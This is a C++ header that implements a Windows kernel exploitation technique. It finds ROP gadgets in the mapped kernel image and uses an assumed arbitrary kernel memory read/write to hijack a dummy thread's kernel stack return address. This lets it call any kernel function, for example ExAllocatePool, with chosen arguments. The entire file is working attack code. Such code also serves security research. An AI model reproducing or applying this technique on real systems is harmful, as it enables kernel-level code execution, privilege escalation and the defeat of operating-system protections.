#pragma once

#define THREAD_EXIT_CODE 0x1337
#define MAX_ARGS (4 + 9)
#define ARGS(_val_) ((PVOID)(_val_))

namespace KF
{
    bool m_bInitialized = false;
    DWORD m_dwKernelSize = 0;
    DWORD m_dwKernelImageSize = NULL;
    PVOID m_ZwTerminateThread = NULL;
    PVOID m_RopAddr_1 = NULL, m_RopAddr_2 = NULL, m_RopAddr_3 = NULL, m_RopAddr_4 = NULL, m_RopAddr_5 = NULL;

    bool ReadPointerWrapper(PVOID Addr, PVOID* Value)
    {
        // read single pointer from virtual memory address
        return ReadKernelMemory(Addr, Value, sizeof(PVOID));
    }

    bool WritePointerWrapper(PVOID Addr, PVOID Value)
    {
        // write single pointer at virtual memory address
        return WriteKernelMemory(Addr, Value, sizeof(PVOID));
    }

    bool Initialize()
    {
        char szKernelName[MAX_PATH], szKernelPath[MAX_PATH];

        if (m_bInitialized) {
            return true;
        }

        PVOID data = nullptr;
        DWORD dwDataSize = 0;
        PIMAGE_NT_HEADERS pHeaders;
        PIMAGE_SECTION_HEADER pSection;

        if (!GetKernelImageInfo(reinterpret_cast<PVOID*>(&m_KernelAddr), &m_dwKernelSize, szKernelName)) {
            return false;
        }

        GetSystemDirectoryA(szKernelPath, MAX_PATH);
        strcat_s(szKernelPath, "\\");
        strcat_s(szKernelPath, szKernelName);

        if (ReadFromFile(szKernelPath, &data, &dwDataSize))
        {
            if (LdrMapImage(data, dwDataSize, &m_KernelImage, &m_dwKernelImageSize)) {
                LdrProcessRelocs(m_KernelImage, reinterpret_cast<PVOID>(m_KernelAddr));
            }
            LocalFree(data);
        }
        else {
            goto _end;
        }

        if (!m_KernelImage) {
            goto _end;
        }

        pHeaders = reinterpret_cast<PIMAGE_NT_HEADERS>(
            RVATOVA(m_KernelImage, reinterpret_cast<PIMAGE_DOS_HEADER>(m_KernelImage)->e_lfanew)
            );

        pSection = reinterpret_cast<PIMAGE_SECTION_HEADER>(
            RVATOVA(&pHeaders->OptionalHeader, pHeaders->FileHeader.SizeOfOptionalHeader)
            );

        for (DWORD i = 0; i < pHeaders->FileHeader.NumberOfSections; ++i)
        {
            if ((pSection->Characteristics & IMAGE_SCN_MEM_EXECUTE) != 0 &&
                (pSection->Characteristics & IMAGE_SCN_MEM_DISCARDABLE) == 0) {
                for (DWORD n = 0; n < pSection->Misc.VirtualSize - 0x100; ++n) {
                    DWORD ptr = pSection->VirtualAddress + n;

                    // Signature of nt!_guard_retpoline_exit_indirect_rax() used as
                    // ROP gadget to control function argument registers
                    UCHAR sign1[] = { 0x48, 0x8b, 0x44, 0x24, 0x20,  // mov     rax, [rsp+0x20]
                                     0x48, 0x8b, 0x4c, 0x24, 0x28,  // mov     rcx, [rsp+0x28]
                                     0x48, 0x8b, 0x54, 0x24, 0x30,  // mov     rdx, [rsp+0x30]
                                     0x4c, 0x8b, 0x44, 0x24, 0x38,  // mov     r8, [rsp+0x38]
                                     0x4c, 0x8b, 0x4c, 0x24, 0x40,  // mov     r9, [rsp+0x40] 
                                     0x48, 0x83, 0xC4, 0x48,        // add     rsp, 48h
                                     0x48, 0xFF, 0xE0 };             // jmp     rax

                    // Match the signature
                    if (MatchSign(RVATOVA(m_KernelImage, ptr), sign1, sizeof(sign1))) {
                        // Calculate an actual kernel address
                        m_RopAddr_1 = RVATOVA(m_KernelAddr, ptr);
                    }

                    // ROP gadget used to reserve an extra space for the stack arguments
                    UCHAR sign2[] = { 0x48, 0x83, 0xC4, 0x68,  // add     rsp, 68h
                                     0xC3 };                   // retn

                    // Match the signature
                    if (MatchSign(RVATOVA(m_KernelImage, ptr), sign2, sizeof(sign2))) {
                        // Calculate an actual kernel address                        
                        m_RopAddr_2 = RVATOVA(m_KernelAddr, ptr);
                    }

                    // RCX control ROP gadget to use in pair with the next one
                    UCHAR sign3[] = { 0x59,  // pop     rcx
                                     0xC3 }; // retn

                    // Match the signature
                    if (MatchSign(RVATOVA(m_KernelImage, ptr), sign3, sizeof(sign3))) {
                        // Calculate an actual kernel address
                        m_RopAddr_3 = RVATOVA(m_KernelAddr, ptr);
                    }

                    // ROP gadget used to save forged function call return value
                    UCHAR sign4[] = { 0x48, 0x89, 0x01,  // mov     [rcx], rax
                                     0xC3 };            // retn

                    // Match the signature
                    if (MatchSign(RVATOVA(m_KernelImage, ptr), sign4, sizeof(sign4))) {
                        // Calculate an actual kernel address
                        m_RopAddr_4 = RVATOVA(m_KernelAddr, ptr);

                        // Dummy gadget for stack alignment
                        m_RopAddr_5 = RVATOVA(m_KernelAddr, ptr + 3);
                    }
                }
            }
            pSection++;
        }

        if (!m_RopAddr_1 || !m_RopAddr_2 || !m_RopAddr_3 || !m_RopAddr_4 || !m_RopAddr_5) {
            goto _end;
        }

        printf("[+] ROP1: %p\n", m_RopAddr_1);
        printf("[+] ROP2: %p\n", m_RopAddr_2);
        printf("[+] ROP3: %p\n", m_RopAddr_3);
        printf("[+] ROP4: %p\n", m_RopAddr_4);
        printf("[+] ROP5: %p\n", m_RopAddr_5);

        // Get address of nt!ZwTerminateThread(), needed to gracefully shutdown our dummy thread with messed up kernel stack
        if ((m_ZwTerminateThread = GetKernelZwProcAddress("ZwTerminateThread")) == nullptr) {
            goto _end;
        }

        m_bInitialized = true;

    _end:

        if (!m_bInitialized) {
            if (m_KernelImage) {
                LocalFree(m_KernelImage);
                m_KernelImage = nullptr;
                m_dwKernelImageSize = 0;
            }
        }

        return m_bInitialized;
    }

    bool Cleanup()
    {
        if (m_KernelImage) {
            LocalFree(m_KernelImage);
            m_KernelImage = NULL;
            m_dwKernelImageSize = 0;
        }

        m_bInitialized = false;
        return true;
    }

    DWORD WINAPI dummyThread(LPVOID lpParam) {
        HANDLE hEvent = lpParam;
        WaitForSingleObject(hEvent, INFINITE);
        return 0;
    }

    bool CallKernelFunctionViaAddress(PVOID ProcAddr, PVOID* Args, DWORD dwArgsCount, PVOID* pRetVal)
    {
        BOOL bRet = FALSE;
        HANDLE hThread = NULL, hEvent = NULL;
        PVOID RetVal = NULL;
        DWORD dwThreadId = 0;
        PUCHAR StackBase = NULL, KernelStack = NULL;
        PVOID RetAddr = NULL;
        PUCHAR Ptr;
        PVOID pThread;

        if (!m_bInitialized)
            return FALSE;

        if (dwArgsCount > MAX_ARGS)
            return FALSE;

        // Create waitable event
        if ((hEvent = CreateEvent(NULL, FALSE, FALSE, NULL)) == NULL)
            goto _end;

        // Create dummy thread
        if ((hThread = CreateThread(NULL, 0, dummyThread, hEvent, 0, &dwThreadId)) == NULL)
            goto _end;

        while (true) {
            // Determine current state of dummy thread
            DWORD State = GetThreadState(GetCurrentProcessId(), dwThreadId);
            if (State == -1)
                goto _end;

            if (State == Waiting)
                break;

            SwitchToThread();
        }

        // Get _KTHREAD address by handle
        pThread = GetObjectAddress(hThread);
        if (pThread == NULL)
            goto _end;

        // Get stack base of the thread
        if (!ReadPointerWrapper(RVATOVA(pThread, KTHREAD_StackBase), (PVOID*)&StackBase))
            goto _end;

        // Get stack pointer of the thread
        if (!ReadPointerWrapper(RVATOVA(pThread, KTHREAD_KernelStack), (PVOID*)&KernelStack))
            goto _end;

        RetAddr = NULL;
        Ptr = StackBase - sizeof(PVOID);

        // Walk over the kernel stack
        while (Ptr > KernelStack) {
            DWORD_PTR Val = 0;

            // Read stack value
            if (!ReadPointerWrapper(Ptr, (PVOID*)&Val))
                goto _end;

            /*
                Check for the return address from system call handler back to
                the nt!KiSystemServiceCopyEnd(), it's located at the bottom
                of the kernel stack.
            */
            if (Val > m_KernelAddr &&
                Val < m_KernelAddr + m_dwKernelSize) {
                RetAddr = Ptr;
                break;
            }

            // Go to the next stack location
            Ptr -= sizeof(PVOID);
        }

        if (RetAddr == NULL)
            goto _end;

#define WRITE_STACK(_offset_, _val_)                                                         \
    if (!WritePointerWrapper(RVATOVA(RetAddr, (_offset_)), (PVOID)(_val_))) {                       \
        goto _end;                                                                          \
    }

        // Hijack the return address with forged function call
        WRITE_STACK(0x00, m_RopAddr_1);

        // Save an address for the forged function call
        WRITE_STACK(0x08 + 0x20, ProcAddr);

        if (dwArgsCount > 0)
            WRITE_STACK(0x08 + 0x28, Args[0]);  // 1st argument goes in RCX

        if (dwArgsCount > 1)
            WRITE_STACK(0x08 + 0x30, Args[1]);  // 2nd argument goes in RDX

        if (dwArgsCount > 2)
            WRITE_STACK(0x08 + 0x38, Args[2]);  // 3rd argument goes in R8

        if (dwArgsCount > 3)
            WRITE_STACK(0x08 + 0x40, Args[3]);  // 4th argument goes in R9

        // Reserve shadow space and 9 stack arguments
        WRITE_STACK(0x50, m_RopAddr_2);

        for (DWORD i = 4; i < dwArgsCount; ++i)
            WRITE_STACK(0x58 + 0x20 + ((i - 4) * sizeof(PVOID)), Args[i]);  // The rest arguments go over the stack right after the shadow space

        // Obtain RetVal address
        WRITE_STACK(0xc0, m_RopAddr_3);
        WRITE_STACK(0xc8, &RetVal);

        // Save return value of the forged function call
        WRITE_STACK(0xd0, m_RopAddr_4);

        // Dummy gadget for stack alignment
        WRITE_STACK(0xd8, m_RopAddr_5);

        // Put the next function call
        WRITE_STACK(0xe0, m_RopAddr_1);

        // Forge nt!ZwTerminateThread() function call
        WRITE_STACK(0xe8 + 0x20, m_ZwTerminateThread);
        WRITE_STACK(0xe8 + 0x28, hThread);
        WRITE_STACK(0xe8 + 0x30, THREAD_EXIT_CODE);

        SwitchToThread();

    _end:

        if (hEvent && hThread) {
            DWORD dwExitCode = 0;

            // Put thread into the ready state
            SetEvent(hEvent);
            WaitForSingleObject(hThread, INFINITE);

            GetExitCodeThread(hThread, &dwExitCode);

            // Check for the magic exit code set by forged call
            if (dwExitCode == THREAD_EXIT_CODE) {
                if (pRetVal) {
                    // Return value of the function
                    *pRetVal = RetVal;
                }
                bRet = TRUE;
            }
        }

        if (hEvent)
            CloseHandle(hEvent);

        if (hThread)
            CloseHandle(hThread);

        return bRet;
    }

    bool CallKernelFunctionViaName(const char* lpszProcName, PVOID* Args, DWORD dwArgsCount, PVOID* pRetVal)
    {
        PVOID FuncAddr = NULL;

        if ((FuncAddr = GetKernelProcAddress(lpszProcName)) == NULL) {
            if (!strncmp(lpszProcName, "Zw", 2)) {
                FuncAddr = GetKernelZwProcAddress(lpszProcName);
            }
        }

        if (FuncAddr == NULL) {
            return FALSE;
        }

        return CallKernelFunctionViaAddress(FuncAddr, Args, dwArgsCount, pRetVal);
    }

    // specialized for no return type
    template<typename... Args>
    void smartNoRetCall(const char* kernelFunctionName, Args... args)
    {
        PVOID argsArray[] = { ARGS(args)... };
        CallKernelFunctionViaName((char*)kernelFunctionName, argsArray, sizeof...(args), NULL);
    }

    template<typename RetType, typename... Args>
    RetType CallKernelFunctionViaName(const char* kernelFunctionName, Args... args)
    {
        PVOID argsArray[] = { ARGS(args)... };

        PVOID pRet = nullptr;
        BOOL bResult = CallKernelFunctionViaName((char*)kernelFunctionName, argsArray, sizeof...(args), &pRet);

        if (bResult) {
            return (RetType)pRet;
        }
        else {
            return RetType();
        }
    }

    PVOID ExAllocatePool(POOL_TYPE PoolType, SIZE_T Size)
    {
        return CallKernelFunctionViaName<PVOID, POOL_TYPE, SIZE_T>("ExAllocatePool", PoolType, Size);
    }
}